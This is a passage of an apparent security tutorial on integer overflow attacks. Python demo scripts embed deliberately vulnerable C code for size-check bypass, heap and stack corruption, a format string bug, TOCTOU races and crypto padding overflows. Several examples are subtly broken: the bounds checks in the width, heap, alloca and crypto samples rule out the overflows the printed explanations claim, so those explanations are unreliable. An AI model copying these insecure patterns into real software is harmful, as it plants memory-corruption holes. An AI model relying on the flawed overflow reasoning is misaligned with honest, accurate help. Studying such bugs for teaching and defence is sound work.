<span class="s1">    unsigned int size1 = atoi(argv[1]);</span>
<span class="s1">    unsigned int size2 = atoi(argv[2]);</span>

<span class="s1">    process_input(size1, size2);</span>
<span class="s1">    return 0;</span>
<span class="s1">}</span>
<span class="s1">&#39;&#39;&#39;</span>

    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Size validation bypass concept:&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;size1 = 1000, size2 = 1000 -&gt; total = 2000 (normal)&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;size1 = 0xffffffff, size2 = 2 -&gt; total = 1 (overflow)&quot;</span><span class="p">)</span>

    <span class="c1"># Both individual sizes pass validation</span>
    <span class="c1"># But their sum overflows to small value</span>
    <span class="n">size1</span> <span class="o">=</span> <span class="mh">0xffffffff</span>  <span class="c1"># UINT_MAX</span>
    <span class="n">size2</span> <span class="o">=</span> <span class="mi">2</span>

    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;size1: </span><span class="si">{</span><span class="n">size1</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;size2: </span><span class="si">{</span><span class="n">size2</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;sum (with overflow): </span><span class="si">{</span><span class="p">(</span><span class="n">size1</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">size2</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0xffffffff</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="k">def</span><span class="w"> </span><span class="nf">width_overflow_attack</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Exploit width calculation overflow&quot;&quot;&quot;</span>

    <span class="n">width_calc_c</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;</span>
<span class="s1">#include &lt;stdio.h&gt;</span>
<span class="s1">#include &lt;stdlib.h&gt;</span>

<span class="s1">typedef struct {</span>
<span class="s1">    unsigned int width;</span>
<span class="s1">    unsigned int height;</span>
<span class="s1">    unsigned char *pixels;</span>
<span class="s1">} image;</span>

<span class="s1">image* create_image(unsigned int width, unsigned int height) {</span>
<span class="s1">    // Check individual dimensions</span>
<span class="s1">    if (width &gt; 10000 || height &gt; 10000) {</span>
<span class="s1">        printf(&quot;Dimensions too large</span><span class="se">\\</span><span class="s1">n&quot;);</span>
<span class="s1">        return NULL;</span>
<span class="s1">    }</span>

<span class="s1">    // VULNERABLE: width * height can overflow</span>
<span class="s1">    unsigned int pixel_count = width * height;</span>

<span class="s1">    printf(&quot;Creating </span><span class="si">%u</span><span class="s1">x</span><span class="si">%u</span><span class="s1"> image (</span><span class="si">%u</span><span class="s1"> pixels)</span><span class="se">\\</span><span class="s1">n&quot;, width, height, pixel_count);</span>

<span class="s1">    image *img = malloc(sizeof(image));</span>
<span class="s1">    if (!img) return NULL;</span>

<span class="s1">    // VULNERABLE: Small allocation due to overflow</span>
<span class="s1">    img-&gt;pixels = malloc(pixel_count);</span>
<span class="s1">    if (!img-&gt;pixels) {</span>
<span class="s1">        free(img);</span>
<span class="s1">        return NULL;</span>
<span class="s1">    }</span>

<span class="s1">    img-&gt;width = width;</span>
<span class="s1">    img-&gt;height = height;</span>

<span class="s1">    return img;</span>
<span class="s1">}</span>

<span class="s1">void fill_image(image *img, unsigned char color) {</span>
<span class="s1">    // This loop uses the original dimensions</span>
<span class="s1">    // But buffer was allocated with overflowed size</span>
<span class="s1">    for (unsigned int y = 0; y &lt; img-&gt;height; y++) {</span>
<span class="s1">        for (unsigned int x = 0; x &lt; img-&gt;width; x++) {</span>
<span class="s1">            img-&gt;pixels[y * img-&gt;width + x] = color;</span>
<span class="s1">        }</span>
<span class="s1">    }</span>
<span class="s1">}</span>
<span class="s1">&#39;&#39;&#39;</span>

    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Width overflow attack concept:&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;width = 65536, height = 65536&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;width * height = 4294967296 = 0 (overflow)&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;malloc(0) allocates small buffer&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;But fill_image writes 65536 * 65536 pixels&quot;</span><span class="p">)</span>

<span class="n">bypass_size_validation</span><span class="p">()</span>
</code></pre></div></td></tr></table></div>
<h3 id="memory-corruption-attacks">Memory Corruption Attacks</h3>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">  1</span>
<span class="normal">  2</span>
<span class="normal">  3</span>
<span class="normal">  4</span>
<span class="normal">  5</span>
<span class="normal">  6</span>
<span class="normal">  7</span>
<span class="normal">  8</span>
<span class="normal">  9</span>
<span class="normal"> 10</span>
<span class="normal"> 11</span>
<span class="normal"> 12</span>
<span class="normal"> 13</span>
<span class="normal"> 14</span>
<span class="normal"> 15</span>
<span class="normal"> 16</span>
<span class="normal"> 17</span>
<span class="normal"> 18</span>
<span class="normal"> 19</span>
<span class="normal"> 20</span>
<span class="normal"> 21</span>
<span class="normal"> 22</span>
<span class="normal"> 23</span>
<span class="normal"> 24</span>
<span class="normal"> 25</span>
<span class="normal"> 26</span>
<span class="normal"> 27</span>
<span class="normal"> 28</span>
<span class="normal"> 29</span>
<span class="normal"> 30</span>
<span class="normal"> 31</span>
<span class="normal"> 32</span>
<span class="normal"> 33</span>
<span class="normal"> 34</span>
<span class="normal"> 35</span>
<span class="normal"> 36</span>
<span class="normal"> 37</span>
<span class="normal"> 38</span>
<span class="normal"> 39</span>
<span class="normal"> 40</span>
<span class="normal"> 41</span>
<span class="normal"> 42</span>
<span class="normal"> 43</span>
<span class="normal"> 44</span>
<span class="normal"> 45</span>
<span class="normal"> 46</span>
<span class="normal"> 47</span>
<span class="normal"> 48</span>
<span class="normal"> 49</span>
<span class="normal"> 50</span>
<span class="normal"> 51</span>
<span class="normal"> 52</span>
<span class="normal"> 53</span>
<span class="normal"> 54</span>
<span class="normal"> 55</span>
<span class="normal"> 56</span>
<span class="normal"> 57</span>
<span class="normal"> 58</span>
<span class="normal"> 59</span>
<span class="normal"> 60</span>
<span class="normal"> 61</span>
<span class="normal"> 62</span>
<span class="normal"> 63</span>
<span class="normal"> 64</span>
<span class="normal"> 65</span>
<span class="normal"> 66</span>
<span class="normal"> 67</span>
<span class="normal"> 68</span>
<span class="normal"> 69</span>
<span class="normal"> 70</span>
<span class="normal"> 71</span>
<span class="normal"> 72</span>
<span class="normal"> 73</span>
<span class="normal"> 74</span>
<span class="normal"> 75</span>
<span class="normal"> 76</span>
<span class="normal"> 77</span>
<span class="normal"> 78</span>
<span class="normal"> 79</span>
<span class="normal"> 80</span>
<span class="normal"> 81</span>
<span class="normal"> 82</span>
<span class="normal"> 83</span>
<span class="normal"> 84</span>
<span class="normal"> 85</span>
<span class="normal"> 86</span>
<span class="normal"> 87</span>
<span class="normal"> 88</span>
<span class="normal"> 89</span>
<span class="normal"> 90</span>
<span class="normal"> 91</span>
<span class="normal"> 92</span>
<span class="normal"> 93</span>
<span class="normal"> 94</span>
<span class="normal"> 95</span>
<span class="normal"> 96</span>
<span class="normal"> 97</span>
<span class="normal"> 98</span>
<span class="normal"> 99</span>
<span class="normal">100</span>
<span class="normal">101</span>
<span class="normal">102</span>
<span class="normal">103</span>
<span class="normal">104</span>
<span class="normal">105</span>
<span class="normal">106</span>
<span class="normal">107</span>
<span class="normal">108</span>
<span class="normal">109</span>
<span class="normal">110</span>
<span class="normal">111</span>
<span class="normal">112</span>
<span class="normal">113</span>
<span class="normal">114</span>
<span class="normal">115</span>
<span class="normal">116</span>
<span class="normal">117</span>
<span class="normal">118</span>
<span class="normal">119</span>
<span class="normal">120</span>
<span class="normal">121</span>
<span class="normal">122</span>
<span class="normal">123</span>
<span class="normal">124</span>
<span class="normal">125</span>
<span class="normal">126</span>
<span class="normal">127</span>
<span class="normal">128</span>
<span class="normal">129</span>
<span class="normal">130</span>
<span class="normal">131</span>
<span class="normal">132</span>
<span class="normal">133</span>
<span class="normal">134</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>

<span class="k">def</span><span class="w"> </span><span class="nf">heap_corruption_via_overflow</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Corrupt heap metadata using integer overflow&quot;&quot;&quot;</span>

    <span class="n">heap_exploit_c</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;</span>
<span class="s1">#include &lt;stdio.h&gt;</span>
<span class="s1">#include &lt;stdlib.h&gt;</span>
<span class="s1">#include &lt;string.h&gt;</span>

<span class="s1">typedef struct {</span>
<span class="s1">    unsigned int size;</span>
<span class="s1">    char *data;</span>
<span class="s1">} buffer_struct;</span>

<span class="s1">buffer_struct* create_buffer(unsigned int count, unsigned int item_size) {</span>
<span class="s1">    // Individual checks pass</span>
<span class="s1">    if (count &gt; 1000000 || item_size &gt; 1000) {</span>
<span class="s1">        printf(&quot;Parameters too large</span><span class="se">\\</span><span class="s1">n&quot;);</span>
<span class="s1">        return NULL;</span>
<span class="s1">    }</span>

<span class="s1">    // VULNERABLE: count * item_size overflows</span>
<span class="s1">    unsigned int total_size = count * item_size;</span>

<span class="s1">    printf(&quot;Creating buffer: </span><span class="si">%u</span><span class="s1"> * </span><span class="si">%u</span><span class="s1"> = </span><span class="si">%u</span><span class="s1"> bytes</span><span class="se">\\</span><span class="s1">n&quot;, count, item_size, total_size);</span>

<span class="s1">    buffer_struct *buf = malloc(sizeof(buffer_struct));</span>
<span class="s1">    if (!buf) return NULL;</span>

<span class="s1">    buf-&gt;data = malloc(total_size);</span>
<span class="s1">    if (!buf-&gt;data) {</span>
<span class="s1">        free(buf);</span>
<span class="s1">        return NULL;</span>
<span class="s1">    }</span>

<span class="s1">    buf-&gt;size = count * item_size;  // Store original calculation</span>

<span class="s1">    return buf;</span>
<span class="s1">}</span>

<span class="s1">void write_pattern(buffer_struct *buf, unsigned char pattern) {</span>
<span class="s1">    // Write pattern to entire &quot;buffer&quot;</span>
<span class="s1">    // But actual allocated size might be much smaller</span>
<span class="s1">    memset(buf-&gt;data, pattern, buf-&gt;size);</span>
<span class="s1">}</span>
<span class="s1">&#39;&#39;&#39;</span>

    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Heap corruption concept:&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;1. Allocate buffer with overflowed size calculation&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;2. Write data based on original size values&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;3. Overwrite adjacent heap chunks&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;4. Corrupt heap metadata&quot;</span><span class="p">)</span>

<span class="k">def</span><span class="w"> </span><span class="nf">stack_corruption_via_alloca</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Corrupt stack using alloca with overflowed size&quot;&quot;&quot;</span>

    <span class="n">alloca_exploit_c</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;</span>
<span class="s1">#include &lt;stdio.h&gt;</span>
<span class="s1">#include &lt;stdlib.h&gt;</span>
<span class="s1">#include &lt;alloca.h&gt;</span>
<span class="s1">#include &lt;string.h&gt;</span>

<span class="s1">void vulnerable_function(unsigned int count, unsigned int size) {</span>
<span class="s1">    // Check individual parameters</span>
<span class="s1">    if (count &gt; 1000 || size &gt; 1000) {</span>
<span class="s1">        printf(&quot;Parameters too large</span><span class="se">\\</span><span class="s1">n&quot;);</span>
<span class="s1">        return;</span>
<span class="s1">    }</span>

<span class="s1">    // VULNERABLE: count * size overflows</span>
<span class="s1">    unsigned int total_size = count * size;</span>

<span class="s1">    printf(&quot;Allocating </span><span class="si">%u</span><span class="s1"> bytes on stack</span><span class="se">\\</span><span class="s1">n&quot;, total_size);</span>

<span class="s1">    // alloca on stack with overflowed size</span>
<span class="s1">    char *stack_buffer = alloca(total_size);</span>

<span class="s1">    // Write based on original calculation</span>
<span class="s1">    for (unsigned int i = 0; i &lt; count; i++) {</span>
<span class="s1">        memset(stack_buffer + i * size, &#39;A&#39; + (i % 26), size);</span>
<span class="s1">    }</span>

<span class="s1">    printf(&quot;Stack buffer filled</span><span class="se">\\</span><span class="s1">n&quot;);</span>
<span class="s1">}</span>
<span class="s1">&#39;&#39;&#39;</span>

    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Stack corruption concept:&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;1. alloca allocates small buffer due to overflow&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;2. Writing loop uses original values&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;3. Overwrites return address and other stack data&quot;</span><span class="p">)</span>

<span class="k">def</span><span class="w"> </span><span class="nf">format_string_with_overflow</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Combine integer overflow with format string&quot;&quot;&quot;</span>

    <span class="n">format_overflow_c</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;</span>
<span class="s1">#include &lt;stdio.h&gt;</span>
<span class="s1">#include &lt;stdlib.h&gt;</span>
<span class="s1">#include &lt;string.h&gt;</span>

<span class="s1">void log_message(char *format, unsigned int repeat_count) {</span>
<span class="s1">    // Simple validation</span>
<span class="s1">    if (repeat_count &gt; 100) {</span>
<span class="s1">        printf(&quot;Repeat count too high</span><span class="se">\\</span><span class="s1">n&quot;);</span>
<span class="s1">        return;</span>
<span class="s1">    }</span>

<span class="s1">    // VULNERABLE: repeat_count * strlen(format) can overflow</span>
<span class="s1">    unsigned int total_length = repeat_count * strlen(format);</span>

<span class="s1">    char *log_buffer = malloc(total_length + 1);</span>
<span class="s1">    if (!log_buffer) return;</span>

<span class="s1">    // Build repeated message</span>
<span class="s1">    log_buffer[0] = &#39;</span><span class="se">\\</span><span class="s1">0&#39;;</span>
<span class="s1">    for (unsigned int i = 0; i &lt; repeat_count; i++) {</span>
<span class="s1">        strcat(log_buffer, format);  // VULNERABLE: format string</span>
<span class="s1">    }</span>

<span class="s1">    // VULNERABLE: User-controlled format string</span>
<span class="s1">    printf(log_buffer);</span>

<span class="s1">    free(log_buffer);</span>
<span class="s1">}</span>
<span class="s1">&#39;&#39;&#39;</span>

    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Combined integer overflow + format string:&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;1. Overflow in length calculation&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;2. Small buffer allocated&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;3. strcat writes beyond buffer&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;4. Format string vulnerability in printf&quot;</span><span class="p">)</span>

<span class="n">heap_corruption_via_overflow</span><span class="p">()</span>
</code></pre></div></td></tr></table></div>
<h2 id="advanced-integer-overflow-techniques">Advanced Integer Overflow Techniques</h2>
<h3 id="race-conditions-with-toctou">Race Conditions with TOCTOU</h3>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">  1</span>
<span class="normal">  2</span>
<span class="normal">  3</span>
<span class="normal">  4</span>
<span class="normal">  5</span>
<span class="normal">  6</span>
<span class="normal">  7</span>
<span class="normal">  8</span>
<span class="normal">  9</span>
<span class="normal"> 10</span>
<span class="normal"> 11</span>
<span class="normal"> 12</span>
<span class="normal"> 13</span>
<span class="normal"> 14</span>
<span class="normal"> 15</span>
<span class="normal"> 16</span>
<span class="normal"> 17</span>
<span class="normal"> 18</span>
<span class="normal"> 19</span>
<span class="normal"> 20</span>
<span class="normal"> 21</span>
<span class="normal"> 22</span>
<span class="normal"> 23</span>
<span class="normal"> 24</span>
<span class="normal"> 25</span>
<span class="normal"> 26</span>
<span class="normal"> 27</span>
<span class="normal"> 28</span>
<span class="normal"> 29</span>
<span class="normal"> 30</span>
<span class="normal"> 31</span>
<span class="normal"> 32</span>
<span class="normal"> 33</span>
<span class="normal"> 34</span>
<span class="normal"> 35</span>
<span class="normal"> 36</span>
<span class="normal"> 37</span>
<span class="normal"> 38</span>
<span class="normal"> 39</span>
<span class="normal"> 40</span>
<span class="normal"> 41</span>
<span class="normal"> 42</span>
<span class="normal"> 43</span>
<span class="normal"> 44</span>
<span class="normal"> 45</span>
<span class="normal"> 46</span>
<span class="normal"> 47</span>
<span class="normal"> 48</span>
<span class="normal"> 49</span>
<span class="normal"> 50</span>
<span class="normal"> 51</span>
<span class="normal"> 52</span>
<span class="normal"> 53</span>
<span class="normal"> 54</span>
<span class="normal"> 55</span>
<span class="normal"> 56</span>
<span class="normal"> 57</span>
<span class="normal"> 58</span>
<span class="normal"> 59</span>
<span class="normal"> 60</span>
<span class="normal"> 61</span>
<span class="normal"> 62</span>
<span class="normal"> 63</span>
<span class="normal"> 64</span>
<span class="normal"> 65</span>
<span class="normal"> 66</span>
<span class="normal"> 67</span>
<span class="normal"> 68</span>
<span class="normal"> 69</span>
<span class="normal"> 70</span>
<span class="normal"> 71</span>
<span class="normal"> 72</span>
<span class="normal"> 73</span>
<span class="normal"> 74</span>
<span class="normal"> 75</span>
<span class="normal"> 76</span>
<span class="normal"> 77</span>
<span class="normal"> 78</span>
<span class="normal"> 79</span>
<span class="normal"> 80</span>
<span class="normal"> 81</span>
<span class="normal"> 82</span>
<span class="normal"> 83</span>
<span class="normal"> 84</span>
<span class="normal"> 85</span>
<span class="normal"> 86</span>
<span class="normal"> 87</span>
<span class="normal"> 88</span>
<span class="normal"> 89</span>
<span class="normal"> 90</span>
<span class="normal"> 91</span>
<span class="normal"> 92</span>
<span class="normal"> 93</span>
<span class="normal"> 94</span>
<span class="normal"> 95</span>
<span class="normal"> 96</span>
<span class="normal"> 97</span>
<span class="normal"> 98</span>
<span class="normal"> 99</span>
<span class="normal">100</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">threading</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>

<span class="k">def</span><span class="w"> </span><span class="nf">toctou_integer_overflow</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Time-of-check to time-of-use with integer overflow&quot;&quot;&quot;</span>

    <span class="n">toctou_c</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;</span>
<span class="s1">#include &lt;stdio.h&gt;</span>
<span class="s1">#include &lt;stdlib.h&gt;</span>
<span class="s1">#include &lt;string.h&gt;</span>
<span class="s1">#include &lt;unistd.h&gt;</span>

<span class="s1">// Global variable that can be modified by another thread</span>
<span class="s1">volatile unsigned int global_size = 100;</span>

<span class="s1">void process_data() {</span>
<span class="s1">    // Time of Check: validate size</span>
<span class="s1">    if (global_size &gt; 1000) {</span>
<span class="s1">        printf(&quot;Size too large: </span><span class="si">%u</span><span class="se">\\</span><span class="s1">n&quot;, global_size);</span>
<span class="s1">        return;</span>
<span class="s1">    }</span>

<span class="s1">    printf(&quot;Size validated: </span><span class="si">%u</span><span class="se">\\</span><span class="s1">n&quot;, global_size);</span>

<span class="s1">    // Simulate delay (another thread can modify global_size here)</span>
<span class="s1">    usleep(1000);</span>

<span class="s1">    // Time of Use: use the size for allocation</span>
<span class="s1">    char *buffer = malloc(global_size);</span>
<span class="s1">    if (!buffer) {</span>
<span class="s1">        printf(&quot;Allocation failed</span><span class="se">\\</span><span class="s1">n&quot;);</span>
<span class="s1">        return;</span>
<span class="s1">    }</span>

<span class="s1">    // Use size again (might be different now)</span>
<span class="s1">    memset(buffer, &#39;A&#39;, global_size);</span>

<span class="s1">    printf(&quot;Buffer filled with size: </span><span class="si">%u</span><span class="se">\\</span><span class="s1">n&quot;, global_size);</span>
<span class="s1">    free(buffer);</span>
<span class="s1">}</span>

<span class="s1">void attacker_thread() {</span>
<span class="s1">    // Wait for victim to pass validation</span>
<span class="s1">    usleep(500);</span>

<span class="s1">    // Change size to cause overflow</span>
<span class="s1">    global_size = 0xffffffff;  // Very large value</span>

<span class="s1">    printf(&quot;Attacker changed size to: </span><span class="si">%u</span><span class="se">\\</span><span class="s1">n&quot;, global_size);</span>
<span class="s1">}</span>
<span class="s1">&#39;&#39;&#39;</span>

    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;TOCTOU integer overflow concept:&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;1. Thread 1 validates global_size (passes check)&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;2. Thread 2 modifies global_size to large value&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;3. Thread 1 uses modified value in allocation/operations&quot;</span><span class="p">)</span>

<span class="k">def</span><span class="w"> </span><span class="nf">atomic_operation_bypass</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Bypass using non-atomic operations&quot;&quot;&quot;</span>

    <span class="n">atomic_c</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;</span>
<span class="s1">#include &lt;stdio.h&gt;</span>
<span class="s1">#include &lt;stdlib.h&gt;</span>
<span class="s1">#include &lt;stdatomic.h&gt;</span>

<span class="s1">atomic_uint shared_counter = 0;</span>

<span class="s1">void increment_and_allocate() {</span>
<span class="s1">    // Non-atomic read-modify-write</span>
<span class="s1">    unsigned int current = atomic_load(&amp;shared_counter);</span>

<span class="s1">    // Validation based on current value</span>
<span class="s1">    if (current &gt; 1000) {</span>
<span class="s1">        printf(&quot;Counter too high: </span><span class="si">%u</span><span class="se">\\</span><span class="s1">n&quot;, current);</span>
<span class="s1">        return;</span>
<span class="s1">    }</span>

<span class="s1">    // Another thread can increment counter here</span>

<span class="s1">    // Increment (non-atomic with validation)</span>
<span class="s1">    current++;</span>
<span class="s1">    atomic_store(&amp;shared_counter, current);</span>

<span class="s1">    // Use incremented value for allocation</span>
<span class="s1">    char *buffer = malloc(current * 1000);  // Can overflow</span>
<span class="s1">    if (buffer) {</span>
<span class="s1">        printf(&quot;Allocated buffer based on counter: </span><span class="si">%u</span><span class="se">\\</span><span class="s1">n&quot;, current);</span>
<span class="s1">        free(buffer);</span>
<span class="s1">    }</span>
<span class="s1">}</span>
<span class="s1">&#39;&#39;&#39;</span>

    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Atomic operation bypass concept:&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;1. Read counter value atomically&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;2. Validate read value&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;3. Non-atomic increment creates race window&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;4. Other threads can modify counter between read and use&quot;</span><span class="p">)</span>

<span class="n">toctou_integer_overflow</span><span class="p">()</span>
</code></pre></div></td></tr></table></div>
<h3 id="cryptographic-integer-overflows">Cryptographic Integer Overflows</h3>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span>
<span class="normal">23</span>
<span class="normal">24</span>
<span class="normal">25</span>
<span class="normal">26</span>
<span class="normal">27</span>
<span class="normal">28</span>
<span class="normal">29</span>
<span class="normal">30</span>
<span class="normal">31</span>
<span class="normal">32</span>
<span class="normal">33</span>
<span class="normal">34</span>
<span class="normal">35</span>
<span class="normal">36</span>
<span class="normal">37</span>
<span class="normal">38</span>
<span class="normal">39</span>
<span class="normal">40</span>
<span class="normal">41</span>
<span class="normal">42</span>
<span class="normal">43</span>
<span class="normal">44</span>
<span class="normal">45</span>
<span class="normal">46</span>
<span class="normal">47</span>
<span class="normal">48</span>
<span class="normal">49</span>
<span class="normal">50</span>
<span class="normal">51</span>
<span class="normal">52</span>
<span class="normal">53</span>
<span class="normal">54</span>
<span class="normal">55</span>
<span class="normal">56</span>
<span class="normal">57</span>
<span class="normal">58</span>
<span class="normal">59</span>
<span class="normal">60</span>
<span class="normal">61</span>
<span class="normal">62</span>
<span class="normal">63</span>
<span class="normal">64</span>
<span class="normal">65</span>
<span class="normal">66</span>
<span class="normal">67</span>
<span class="normal">68</span>
<span class="normal">69</span>
<span class="normal">70</span>
<span class="normal">71</span>
<span class="normal">72</span>
<span class="normal">73</span>
<span class="normal">74</span>
<span class="normal">75</span>
<span class="normal">76</span>
<span class="normal">77</span>
<span class="normal">78</span>
<span class="normal">79</span>
<span class="normal">80</span>
<span class="normal">81</span>
<span class="normal">82</span>
<span class="normal">83</span>
<span class="normal">84</span>
<span class="normal">85</span>
<span class="normal">86</span>
<span class="normal">87</span>
<span class="normal">88</span>
<span class="normal">89</span>
<span class="normal">90</span>
<span class="normal">91</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>

<span class="k">def</span><span class="w"> </span><span class="nf">crypto_length_overflow</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Integer overflow in cryptographic operations&quot;&quot;&quot;</span>

    <span class="n">crypto_c</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;</span>
<span class="s1">#include &lt;stdio.h&gt;</span>
<span class="s1">#include &lt;stdlib.h&gt;</span>
<span class="s1">#include &lt;string.h&gt;</span>
<span class="s1">#include &lt;openssl/aes.h&gt;</span>

<span class="s1">void encrypt_data(unsigned char *plaintext, unsigned int plaintext_len) {</span>
<span class="s1">    // Validate input length</span>
<span class="s1">    if (plaintext_len &gt; 1000000) {</span>
<span class="s1">        printf(&quot;Plaintext too long</span><span class="se">\\</span><span class="s1">n&quot;);</span>
<span class="s1">        return;</span>
<span class="s1">    }</span>

<span class="s1">    // VULNERABLE: padding calculation can overflow</span>
<span class="s1">    unsigned int padded_len = plaintext_len + 16;  // Add AES block size</span>

<span class="s1">    if (padded_len &lt; plaintext_len) {</span>
<span class="s1">        printf(&quot;Overflow detected</span><span class="se">\\</span><span class="s1">n&quot;);</span>
<span class="s1">        return;</span>
<span class="s1">    }</span>

<span class="s1">    // Allocate buffer for padded plaintext</span>
<span class="s1">    unsigned char *padded = malloc(padded_len);</span>
<span class="s1">    if (!padded) return;</span>

<span class="s1">    // Copy plaintext</span>
<span class="s1">    memcpy(padded, plaintext, plaintext_len);</span>

<span class="s1">    // Add padding</span>
<span class="s1">    unsigned int padding_len = 16 - (plaintext_len % 16);</span>
<span class="s1">    memset(padded + plaintext_len, padding_len, padding_len);</span>

<span class="s1">    // Encrypt (simplified)</span>
<span class="s1">    printf(&quot;Encrypting </span><span class="si">%u</span><span class="s1"> bytes</span><span class="se">\\</span><span class="s1">n&quot;, padded_len);</span>

<span class="s1">    free(padded);</span>
<span class="s1">}</span>
<span class="s1">&#39;&#39;&#39;</span>

    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Cryptographic integer overflow:&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;1. plaintext_len = 0xfffffff0&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;2. padded_len = plaintext_len + 16 = 0 (overflow)&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;3. malloc(0) allocates small buffer&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;4. memcpy writes large amount to small buffer&quot;</span><span class="p">)</span>

<span class="k">def</span><span class="w"> </span><span class="nf">hash_length_extension</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Hash length extension with integer overflow&quot;&quot;&quot;</span>

    <span class="n">hash_c</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;</span>
<span class="s1">#include &lt;stdio.h&gt;</span>
<span class="s1">#include &lt;stdlib.h&gt;</span>
<span class="s1">#include &lt;string.h&gt;</span>

<span class="s1">void hash_with_secret(unsigned char *message, unsigned int msg_len, </span>
<span class="s1">                     unsigned char *secret, unsigned int secret_len) {</span>

<span class="s1">    // VULNERABLE: total_len can overflow</span>
<span class="s1">    unsigned int total_len = msg_len + secret_len;</span>

<span class="s1">    if (total_len &lt; msg_len || total_len &lt; secret_len) {</span>
